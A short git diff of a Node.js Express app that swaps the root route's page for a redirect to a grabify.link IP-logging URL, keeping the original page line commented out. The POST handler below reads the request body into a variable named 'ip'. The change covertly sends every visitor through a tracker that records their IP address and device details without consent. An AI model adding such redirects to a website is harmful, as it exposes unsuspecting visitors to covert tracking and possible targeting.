@@ -13,7 +13,8 @@ app.use(express.json());
 
 // rutas
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'root.html'));
+  res.redirect('https://grabify.link/4OAURZ')
+    //res.sendFile(path.join(__dirname, 'public', 'root.html'));
 });
 app.post('/', async (req, res) =>{
     let ip = req.body;
